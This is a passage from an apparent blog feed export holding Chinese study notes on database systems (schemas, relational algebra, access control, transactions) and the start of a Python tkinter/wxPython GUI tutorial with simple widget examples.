数据库系统的内部结构</h3><p>数据库系统内部采用三级模式二级映像结构，三级模式为：外模式，模式，内模式。二级映像：外模式/模式映射，模式/内模式映射</p><p>1．模式：是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图，一个数据库只能有一个概念模式。<br>2．内模式：是数据库中全体数据的物理结构和存储方式的描述，是数据在数据库内部的表示方式，一个数据库只能有一个内模式。</p><p>3．外模式：又称为子模式或用户模式，是模式的子集，是数据库用户能够看到和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示，一个数据库可以有多个外模式。</p><p>4．外模式/模式映像：对于每一个外模式，都有一个外模式/模式映像。它定义了该外模式与模式之间的对应关系。</p><p>5．模式/内模式映像，数据库中有唯一的一个模式/内模式映像，它定义了数据全局逻辑结构与存储结构之间的对应关系。</p><h3 id="1-6-数据库系统的外部结构"><a href="#1-6-数据库系统的外部结构" class="headerlink" title="1.6 数据库系统的外部结构"></a>1.6 数据库系统的外部结构</h3><p>略</p><h3 id="1-7-常见的关系数据库"><a href="#1-7-常见的关系数据库" class="headerlink" title="1.7 常见的关系数据库"></a>1.7 常见的关系数据库</h3><blockquote><p>Oracle数据库</p><p>由数据库软件领域的第一大厂商     Oracle公司研发<br>主要应用于大型企业数据库领域；跨平台，支持Windows、UNIX等多种操作系统；运行稳定、功能齐全、性能超群</p></blockquote><blockquote><p>SQL Server数据库管理系统            由微软公司研发的中大型数据库管理系统<br>只能运行于Windows平台上；界面友好，易学易用；支持C/S、B/S模式</p></blockquote><blockquote><p>Sybase                                               由Sybase公司研发的大型数据库管理系统<br>可以运行于UNIX、VXM、Windows等多种操作系统平台上，支持标准的SQL语言：使用C/S工作模式</p></blockquote><blockquote><p>DB2<br>是IBM公司研发的一个多媒体、Web关系型数据库<br>起初主要应用在大型机上，目前支持多种机型</p></blockquote><blockquote><p>MySQL                                               Oracle公司旗下产品<br>体积小、速度快、功能有限；开放源码软件</p></blockquote><h2 id="第2章-数据库系统原理"><a href="#第2章-数据库系统原理" class="headerlink" title="第2章 数据库系统原理"></a>第2章 数据库系统原理</h2><h3 id="2-1关系的形式化定义及有关概念"><a href="#2-1关系的形式化定义及有关概念" class="headerlink" title="2.1关系的形式化定义及有关概念"></a>2.1关系的形式化定义及有关概念</h3><p>关系模型以集合代数理论为基础，本节将从集合论角度给出关系的形式化定义</p><blockquote><ol><li>域（Domain）</li><li>笛卡尔积（Cartesian Product）</li><li>关系（Relation）</li></ol></blockquote><p><strong>域</strong>是一组具有相同数据类型的值的集合，又称为值域，用D 表示.</p><p>**笛卡尔积(Cartesian Product)**给定一组域D1,D2,…,Dn,它们中可以有相同的域。D1,D2,…,Dn的笛卡尔积为:D=D1×D2×…×Dn＝{(d1,d2,…,dn)｜diDi,i＝1,2,…,n}</p><p>笛卡尔积的元组可以用二维表的形式表示</p><p><strong>关系（Relation）</strong>D1×D2×…×Dn的有意义的子集称为在域D1，D2，…，Dn上的关系，表示为R（D1，D2，…，Dn） student(sno,sname,ssex)，R：关系名，n：关系的目或度（Degree）<br>当n=1 时，称该关系为单元关系，当 n=2时，称该关系为二元关系</p><blockquote><p>列是同质的，即每一列的分量是同一类型的数据，来自同一个域；<br>属性名是唯一的，不同的列可以出自同一个域，但属性名必须不同；<br>码的唯一性，即任意两个元组的码不能相同，从而任意两个元组不相同；<br>列的顺序无关性，即交换任意两列的次序，得到的还是同一个关系；<br>行的顺序无关性，即交换任意两行的次序，得到的还是同一个关系；<br>分量的原子性，即每个分量都是不可分的数据项。</p></blockquote><p>关系模式:关系模式是对一个关系结构的描述，包括关系由哪些属性构成，这些属性来自哪些域，以及属性和域之间的映射关系(mapping)。因此，一个关系模式应当是一个五元组。<br>关系模式（Relation Schema）是对关系的描述，可形式化地表示为R (U，D，DOM，F)      student(sno, sname, ssex)</p><blockquote><p>R为关系模式名<br>U为组成该关系的属性名的集合<br>D为属性组U中属性所来自的域的集合<br>DOM为属性向域映像的集合<br>F为属性间函数依赖关系的集合</p></blockquote><ul><li>关系  关系是由满足关系模式结构的元组构成的集合，是关系模式在某一时刻的状态或内容</li><li>关系数据库  在一个给定的应用领域中，所有实体entity以及实体间联系(relationship)的集合构成一个关系数据库</li></ul><h3 id="2-2关系数据库示例"><a href="#2-2关系数据库示例" class="headerlink" title="2.2关系数据库示例"></a>2.2关系数据库示例</h3><ol><li>码（Key）：又称为候选码（Candidate  Key）能唯一标识关系中的每一个元组的最少属性的集合。一个关系可能有多个候选码</li><li>主码（Primary  Key）：又称为主键，在候选码中选出一个即可作为主码在一个关系中，主码只能有一个</li><li>全码（ALL- Key）：关系中所有属性的组合才是该关系的码，一个关系最多只有一个全码</li><li>外码（Foreign  Key）：设属性F是关系R的一个属性，但不是R的码，如果F与关系S中的主码Ks相对应，则称F是R的外码，R为参照关系（Referencing  Relation），S为被参照关系（Referenced  Relation）。R和S不一定是不同的关系，通过外码可以建立两个表之间的联系，在一个关系中，外码可能有多个</li><li>主属性（Prime  Attribute）：包含在所有候选码中的属性称为主属性</li><li>非主属性（Nonprime  Attribute）：不包含在任何一个候选码中的属性称为非主属性。</li></ol><h3 id="2-3关系模型的完整性"><a href="#2-3关系模型的完整性" class="headerlink" title="2.3关系模型的完整性"></a>2.3关系模型的完整性</h3><blockquote><p>作用：为了确保数据库里边的数据是正确的、有效的、一致的。</p></blockquote><p><strong>实体完整性</strong>(Entity Integrity)：1.若属性A是基本关系R的主属性，则属性A不能取空值；2.关系的所有的主属性都不能取空值，而不仅是主码整体不能取空值</p><p><strong>参照完整性</strong>若属性（或属性组）F是基本关系R的外码，它与基本关系S的主码KS相对应,则对于R中的每个元组在F上的值必须为：要么取空值，要么等于被参照关系中的主键的某个值</p><p><strong>用户自定义完整性</strong>属性的取值应当满足用户定义的约束条件，反映了某一具体应用所涉及的数据必须满足的语义要求。</p><h3 id="2-4关系模型的数据操作"><a href="#2-4关系模型的数据操作" class="headerlink" title="2.4关系模型的数据操作"></a>2.4关系模型的数据操作</h3><p>数据模型三要素：数据结构、数据操作、完整性约束</p><p>数据查询(Query)：选择(Select)、投影(Project)、连接(Join)、除(Divide)、并(Union)、交(Intersection)、差(Difference)、笛卡儿积<br>数据更新(Update)：插入(Insert)、删除(Delete)、修改(Modify)</p><h3 id="2-5关系代数"><a href="#2-5关系代数" class="headerlink" title="2.5关系代数"></a>2.5关系代数</h3><p>关系代数是一种抽象的查询语言，是研究关系数据语言的数学工具</p><h4 id="关系的运算符"><a href="#关系的运算符" class="headerlink" title="关系的运算符"></a>关系的运算符</h4><blockquote><ul><li>集合运算符：将关系看成元组的集合运算，是从关系的“水平”方向即行的角度来进行</li><li>专门的关系运算符：不仅涉及行而且涉及列</li><li>比较运算符：辅助专门的关系运算符进行操作</li><li>逻辑运算符：辅助专门的关系运算符进行操作</li></ul></blockquote><h4 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h4><h5 id="并"><a href="#并" class="headerlink" title="并"></a>并</h5><p>关系R和关系S的要求：具有相同的目n，即两个关系都有n个属性，相应的属性取自同一个域。</p><blockquote><p>$$<br>R∪S 结果仍为n目关系，由属于R或属于S的元组组成R∪S = { t|t \in R∨t \in S }<br>$$</p></blockquote><h5 id="差"><a href="#差" class="headerlink" title="差"></a>差</h5><p>关系R和关系S的要求：具有相同的目n，相应的属性取自同一个域</p><blockquote><p>$$<br>R - S<br>结果仍为n目关系，由属于R而不属于S的所有元组组成<br>                R -S = { t|t\in R∧t \notin S }<br>$$</p></blockquote><h5 id="交"><a href="#交" class="headerlink" title="交"></a>交</h5><p>关系R和关系S的要求：具有相同的目n，相应的属性取自同一个域</p><blockquote><p>$$<br>R∩S<br>结果仍为n目关系，由既属于R又属于S的元组组成,R∩S = { t|t \in R∧t \in S }<br>$$</p></blockquote><h5 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h5><pre class="line-numbers language-none"><code class="language-none">R：n目关系，k1个元组S：m目关系，k2个元组R×S：列：（n+m）列的元组的集合，元组的前n列是关系R的一个元组，后m列是关系S的一个元组行：k1×k2个元组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$$<br>R×S = { tr∩ts |tr \in R ∧ ts \in S }<br>$$</p><h4 id="专门的关系运算"><a href="#专门的关系运算" class="headerlink" title="专门的关系运算"></a>专门的关系运算</h4><h5 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h5><h5 id="投影"><a href="#投影" class="headerlink" title="投影"></a>投影</h5><h5 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h5><h5 id="除"><a href="#除" class="headerlink" title="除"></a>除</h5><h2 id="第5章-数据库的安全性"><a href="#第5章-数据库的安全性" class="headerlink" title="第5章  数据库的安全性"></a>第5章  数据库的安全性</h2><blockquote><p>数据库的安全性是指保护数据库，以防止不合法的使用造成数据泄露、更改或破坏<br>不合法的使用一般是指合法用户进行的非法操作以及非法用户进行的所有操作<br>数据库的安全性就是保证所有合法的用户进行合法的操作</p></blockquote><h3 id="5-1-计算机安全性概述"><a href="#5-1-计算机安全性概述" class="headerlink" title="5.1 计算机安全性概述"></a>5.1 计算机安全性概述</h3><p>计算机系统的安全性问题可分为三大类：技术安全，管理安全，政策法律</p><h3 id="5-2-数据库安全性控制"><a href="#5-2-数据库安全性控制" class="headerlink" title="5.2 数据库安全性控制"></a>5.2 数据库安全性控制</h3><p>在一般的计算机系统中，安全措施是一级一级层层设置的</p><p><img src="D:\blog\shierjinghuang\source_posts\数据库复习资料整理\1657872425851.png"></p><h4 id="用户标识与鉴别"><a href="#用户标识与鉴别" class="headerlink" title="用户标识与鉴别"></a>用户标识与鉴别</h4><p>用户标识与鉴别是数据库系统的最外层安全保护措施<br>其方法是由系统提供一定的方式让用户标识自己的身份，每次用户要求进入系统时，由系统进行核对，通过鉴定后才会提供系统使用权</p><h4 id="存取控制机制"><a href="#存取控制机制" class="headerlink" title="存取控制机制"></a>存取控制机制</h4><p>数据库的安全性措施中最重要的是DBMS的存取控制机制</p><p>合法权限检查<br>当用户发出存取数据的操作请求后，DBMS查找数据字典，根据安全规则进行合法权限检查。<br>若用户的操作请求超出了定义的权限，系统将拒绝执行该操作。</p><p>大多数DBMS支持的存取控制策略主要有两种：自主存取控制，强制存取控制</p><p>自主存取控制方法的特点如下：<br>① 同一用户对于不同的数据库对象有不同的存取权限；<br>② 不同的用户对同一对象也有不同的权限；<br>③ 用户还可将其拥有的存取权限转授给其他用户</p><p>强制存取控制</p><p>在MAC中，DBMS管理的全部实体分为主体和客体<br>主体<br>是指系统中活动的实体，如用户、进程等<br>客体<br>是系统中的被动实体，如文件、基本表、视图等<br>对主体和客体的每一个实例（值）都指派一个敏感度标记<br>主体的敏感度标记称为“许可证级别”<br>客体的敏感度标记称为“密级”<br>敏感度标记的级别从高到低依次为：绝密、机密、可信和公开等</p><p>强制存取控制方法的特点如下：<br>① 每一个数据对象被标以一定的密级；<br>② 每一个用户也被授予某一个级别的许可证；<br>③ 通过对比主体和客体的级别，最终确定主体能否存取客体，只有具有合法许可证的用户才可以存取数据。<br>在MAC中，主体存取客体要遵循如下规则：<br>① 仅当主体的许可证级别大于或等于客体的密级时，该主体才能读取相应的客体；<br>② 仅当主体的许可证级别等于客体的密级时，该主体才能写相应的客体。</p><h4 id="视图机制"><a href="#视图机制" class="headerlink" title="视图机制"></a>视图机制</h4><p>在进行存取权限控制时，可以为不同的用户定义不同的视图，把数据对象限制在一定的范围内<br>也就是说，通过视图机制把要保密的数据对无权存取的用户隐藏起来，从而自动地对数据提供一定程度的<br>但视图机制的安全保护功能太不精细，往往不能达到应用系统的要求，其主要功能在于提供了数据库的逻辑独立性<br>在实际应用中，通常将视图机制与授权机制结合起来使用，首先利用视图机制屏蔽一部分保密数据，然后在视图上再进一步定义存取权限安全保护</p><h4 id="审计跟踪"><a href="#审计跟踪" class="headerlink" title="审计跟踪"></a>审计跟踪</h4><p>审计功能是一种监视措施，它把用户对数据库的所有操作自动记录下来，存入审计日志中<br>记录的内容一般包括：操作类型（查询、插入、更新、删除），操作终端标识与操作者标识，操作日期和时间，操作所涉及的相关数据，数据的前象和后象等<br>DBA可以利用审计跟踪的信息，重现导致数据库现有状况的一系列事件，找出非法存取数据的人、时间和内容等。<br>审计通常是很费时间和空间的，所以DBMS把它作为系统的可选特征，DBA根据应用环境对安全性的要求，可以灵活地打开或关闭审计功能。</p><h4 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h4><p>数据加密是防止数据库中数据在存储和传输中失密的有效手段<br>加密的基本思想是根据一定的算法将原始数据变化为不可直接识别的格式，数据以密文的形式存储和传输<br>加密方法主要有两种<br>一种是替换方法<br>一种是置换方法<br>数据加密功能通常也作为可选特征</p><h4 id="统计数据库的安全性"><a href="#统计数据库的安全性" class="headerlink" title="统计数据库的安全性"></a>统计数据库的安全性</h4><h2 id="第6章-事务与并发控制"><a href="#第6章-事务与并发控制" class="headerlink" title="第6章  事务与并发控制"></a>第6章  事务与并发控制</h2><h3 id="6-1-事务"><a href="#6-1-事务" class="headerlink" title="6.1 事务"></a>6.1 事务</h3><p>事务（Transaction）是用户定义的一个数据库操作序列，这些操作要么全做，要么全不做，是一个不可分割的工作单位。</p><p>一个程序在后台运行时通常被分割成多个事务，即一个程序由多个事务组成。事务可以是一条SQL语句，一组SQL语句或整个程序<br>事务的划分有两种方式：隐式划分，显式划分</p><h4 id="事务的特征"><a href="#事务的特征" class="headerlink" title="事务的特征:"></a><strong>事务的特征:</strong></h4><ol><li><p>原子性：事务是数据库的逻辑工作单位，是不可分割的工作单元，事务中的诸操作要么都做，要么都不做。</p></li><li><p>持久性：也称永久性，一个事务一旦提交它对数据库中数据的改变就应该是永久性的，接下来的其他操作或故障不应该对其执行结果由任何影响</p></li><li><p>隔离性：一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对于其他事务是隔离的，并发执行的各个事务之间不能互相干扰。</p></li><li><p>一致性：事务的执行结果必须是使数据库从一个一致性状态变到另一个一致性状态，一致性状态是指数据库中只包含成功事务提交的结果，不一致状态是指数据库中包含失败事务提交的部分结果。</p></li></ol><h4 id="事务的执行方式"><a href="#事务的执行方式" class="headerlink" title="事务的执行方式"></a><strong>事务的执行方式</strong></h4><ol><li><p>串行：按顺序依次执行，执行完一个事务后才能开始另一个事务</p></li><li><p>交叉并发执行：是指多个事务轮流交叉并发执行</p></li></ol><h3 id="6-2-并发控制"><a href="#6-2-并发控制" class="headerlink" title="6.2 并发控制"></a>6.2 并发控制</h3><p>丢失修改:</p><p>丢失修改的含义：两个事务T1和T2读取同一数据并分别进行修改，T1先提交了修改结果，T2后提交的修改结果覆盖了T1提交的结果，导致T1的修改结果丢失</p><p>读“脏”数据:</p><p>读“脏”数据的含义：事务T1修改某一数据，并将其写回磁盘。事务T2读取同一数据后，事务T1由于某种原因被撤销，这时事务T1修改过的数据恢复原值，而事务T2读取到的是一个过渡性的不再需要的脏数据，与数据库中的数据不同。</p><p>不可重复读:</p><h3 id="6-3-封锁"><a href="#6-3-封锁" class="headerlink" title="6.3 封锁"></a>6.3 封锁</h3><h3 id="6-4-并发调度的可串行性"><a href="#6-4-并发调度的可串行性" class="headerlink" title="6.4 并发调度的可串行性"></a>6.4 并发调度的可串行性</h3><h3 id="6-5-两段锁协议"><a href="#6-5-两段锁协议" class="headerlink" title="6.5 两段锁协议"></a>6.5 两段锁协议</h3>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python的GUI编程和tkinter，Wxpython</title>
      <link href="/2022/07/05/python%E7%9A%84GUI%E7%BC%96%E7%A8%8B%E5%92%8Ctkinter/"/>
      <url>/2022/07/05/python%E7%9A%84GUI%E7%BC%96%E7%A8%8B%E5%92%8Ctkinter/</url>
      
        <content type="html"><![CDATA[<h1 id="Python的GUI编程和tkinter，Wxpython"><a href="#Python的GUI编程和tkinter，Wxpython" class="headerlink" title="Python的GUI编程和tkinter，Wxpython"></a>Python的GUI编程和tkinter，Wxpython</h1><blockquote><p>PythonGUI这个内容是我在课程论文准备之初临时去学的一些内容，起初我准备学下tkinter做我课程论文项目的前段显示，但是由于临时的一些变动，我最终是采用了Wxpython的方式进行的可视化。当然这两个库在本质上都属于PythonGul。</p></blockquote><p>[TOC]</p><h2 id="PythonGUI介绍："><a href="#PythonGUI介绍：" class="headerlink" title="PythonGUI介绍："></a>PythonGUI介绍：</h2><ul><li><strong>Tkinter：</strong> Tkinter 模块(Tk 接口)是 Python 的标准 Tk GUI 工具包的接口 .Tk 和 Tkinter 可以在大多数的 Unix 平台下使用,同样可以应用在 Windows 和 Macintosh 系统里。Tk8.0 的后续版本可以实现本地窗口风格,并良好地运行在绝大多数平台中。</li><li><strong>wxPython：</strong>wxPython 是一款开源软件，是 Python 语言的一套优秀的 GUI 图形库，允许 Python 程序员很方便的创建完整的、功能健全的 GUI 用户界面。</li><li><strong>Jython：</strong>Jython 程序可以和 Java 无缝集成。除了一些标准模块，Jython 使用 Java 的模块。Jython 几乎拥有标准的Python 中不依赖于 C 语言的全部模块。比如，Jython 的用户界面将使用 Swing，AWT或者 SWT。Jython 可以被动态或静态地编译成 Java 字节码。</li></ul><h2 id="tkinter"><a href="#tkinter" class="headerlink" title="tkinter"></a>tkinter</h2><h3 id="根窗体root："><a href="#根窗体root：" class="headerlink" title="根窗体root："></a>根窗体root：</h3><p>根窗体是图像化应用程序的根控制器，是tkinter的底层控件的实例。当导入tkinter模块后，调用 Tk()方法可初始化一个根窗体实例 root ,用 title() 方法可设置其标题文字，用geometry()方法可以设置窗体的大小（以像素为单位）。将其置于主循环中，除非用户关闭，否则程序始终处于运行状态。执行该程序，一个窗体就呈现出来了。在这个主循环的根窗体中，可持续呈现中的其他可视化控件实例，监测事件的发生并执行相应的处理程序 </p><p>主窗口位置和大小通过，geometry(‘wxh ± y ± z’)方法进行设置，w为宽度，h为高度，x用于分隔高度和宽度，+x表示距离屏幕左边的距离，-x表示距离屏幕右边的距离，±y同理。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#代码实现：</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'我的第一个Python窗体'</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'240x240'</span><span class="token punctuation">)</span> <span class="token comment"># 这里的乘号不是 * ，而是小写英文字母 x</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="GUI组件表："><a href="#GUI组件表：" class="headerlink" title="GUI组件表："></a>GUI组件表：</h3><p>Tkinter的提供各种控件，如按钮，标签和文本框，一个GUI应用程序中使用。这些控件通常被称为控件或者部件。目前有15种Tkinter的部件。</p><table><thead><tr><th>Button</th><th>按钮控件；在程序中显示按钮。</th></tr></thead><tbody><tr><td>Canvas</td><td>画布控件；显示图形元素如线条或文本</td></tr><tr><td>Checkbutton</td><td>多选框控件；用于在程序中提供多项选择框</td></tr><tr><td>Entry</td><td>输入控件；用于显示简单的文本内容</td></tr><tr><td>Frame</td><td>框架控件；在屏幕上显示一个矩形区域，多用来作为容器</td></tr><tr><td>Label</td><td>标签控件；可以显示文本和位图</td></tr><tr><td>Listbox</td><td>列表框控件；在Listbox窗口小部件是用来显示一个字符串列表给用户</td></tr><tr><td>Menubutton</td><td>菜单按钮控件，用于显示菜单项。</td></tr><tr><td>Menu</td><td>菜单控件；显示菜单栏,下拉菜单和弹出菜单</td></tr><tr><td>Message</td><td>消息控件；用来显示多行文本，与label比较类似</td></tr><tr><td>Radiobutton</td><td>单选按钮控件；显示一个单选的按钮状态</td></tr><tr><td>Scale</td><td>范围控件；显示一个数值刻度，为输出限定范围的数字区间</td></tr><tr><td>Scrollbar</td><td>滚动条控件，当内容超过可视化区域时使用，如列表框。.</td></tr><tr><td>Text</td><td>文本控件；用于显示多行文本</td></tr><tr><td>Toplevel</td><td>容器控件；用来提供一个单独的对话框，和Frame比较类似</td></tr><tr><td>Spinbox</td><td>输入控件；与Entry类似，但是可以指定输入范围值</td></tr><tr><td>PanedWindow</td><td>PanedWindow是一个窗口布局管理的插件，可以包含一个或者多个子控件。</td></tr><tr><td>LabelFrame</td><td>labelframe 是一个简单的容器控件。常用与复杂的窗口布局。</td></tr><tr><td>messagebox</td><td>用于显示你应用程序的消息框。</td></tr></tbody></table><h4 id="Python-Tkinter-通用控件属性："><a href="#Python-Tkinter-通用控件属性：" class="headerlink" title="Python Tkinter 通用控件属性："></a>Python Tkinter 通用控件属性：</h4><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1657019136331.png"  /><h4 id="Python-Tkinter-按钮组件-Button"><a href="#Python-Tkinter-按钮组件-Button" class="headerlink" title="Python Tkinter 按钮组件 (Button)"></a>Python Tkinter 按钮组件 (Button)</h4><p>按钮组件用于在 Python 应用程序中添加按钮，按钮上可以放上文本或图像，按钮可用于监听用户行为，能够与一个 Python 函数关联，当按钮被按下时，自动调用该函数。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">w <span class="token operator">=</span> Button <span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token operator">=</span>value<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># master 组件的父容器</span><span class="token comment"># option 可选项，这个包括很多内容这些选项可以用键 = 值的形式设置，并以逗号分隔</span><span class="token comment"># 包括command（按钮的关联函数），font（文本字体），height（按钮的高度），image（按钮的背景图片），width，text（文本），underline（下划线）等内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> Button按钮的状态有：<code>normal</code>  ,  <code>active</code>  ,  <code>disabled</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox top <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">helloCallBack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span><span class="token string">"Hello Python"</span><span class="token punctuation">,</span> <span class="token string">"Hello Runoob"</span><span class="token punctuation">)</span>B <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"点我"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>helloCallBack<span class="token punctuation">)</span>B<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>top<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里稍微做一点说明，这个实例来自于菜鸟教程，而在菜鸟教程上的写法是 import tkMessageBox ,还是有很多区别的，在python3以后的版本中，tkinter应该首字母小写，而tkMessageBox及库中对应的函数应该相应改为<strong>tkinter.messagebox</strong></p><p>在具体使用按钮组件进行函数调用时也有对应内容：</p><ul><li><p>直接调用函数。<strong>参数表达式为“command=函数名”，注意函数名后面不要加括号，也不能传递参数</strong>。如下面的command=run1：</p></li><li><p>利用匿名函数调用函数和传递参数。参数的表达式为“command=lambda”:函数名（参数列表）</p></li></ul><h5 id="Python-Tkinter-单选按钮控件-Radiobutton"><a href="#Python-Tkinter-单选按钮控件-Radiobutton" class="headerlink" title="Python Tkinter 单选按钮控件(Radiobutton)"></a>Python Tkinter 单选按钮控件(Radiobutton)</h5><p>是为了响应故乡排斥的若干单选项的单击事件以触发运行自定义函数所设的，该控件排除具有共有属性外，还具有显示文本（text）、返回变量（variable）、返回值（value）、响应函数名（command）等重要属性。响应函数名“command=函数名”的用法与Button相同，函数名最后也要加括号。返回变量variable=var通常应预先声明变量的类型var=IntVar()或var=StringVar(),在所调用的函数中方可用var.get()方法获取被选中实例的value值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">Mysel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">'甲'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">'乙'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">'丙'</span><span class="token punctuation">&#125;</span>      s <span class="token operator">=</span> <span class="token string">"您选了"</span> <span class="token operator">+</span> dic<span class="token punctuation">.</span>get<span class="token punctuation">(</span>var<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"项"</span>      lb<span class="token punctuation">.</span>config<span class="token punctuation">(</span>text <span class="token operator">=</span> s<span class="token punctuation">)</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'单选按钮'</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>var <span class="token operator">=</span> IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>rd1 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"甲"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>rd2 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"乙"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd2<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>rd3 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"丙"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd3<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Python-Tkinter-复选框（Checkbutton）"><a href="#Python-Tkinter-复选框（Checkbutton）" class="headerlink" title="Python Tkinter 复选框（Checkbutton）"></a>Python Tkinter 复选框（Checkbutton）</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义方法</span>w <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token operator">=</span>value<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># 在python3中，复选框的定义方式发生了略微改变</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>复选框</strong>：(Checkbutton) 是为了返回多个选项值的交互控件，通常不直接触发函数的执行。该控件除具有共有属性外，还具有显示文本（text）、返回变量（variable）、选中返回值（onvalue）和未选中默认返回值（offvalue）等重要属性。返回变量variable=var 通常可以预先逐项分别声明变量的类型var=IntVar() (默认)或 var=StringVar(), 在所调用的函数中方可分别调用 var.get()方法 取得被选中实例的 onvalue或offvalue值。复选框实例通常还可分别利用 select()、deselect()和 toggle() 方法对其进行选中、清除选中和反选操作。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#简单样例：</span><span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox<span class="token keyword">import</span> tkintertop <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>CheckVar1 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>CheckVar2 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>C1 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token 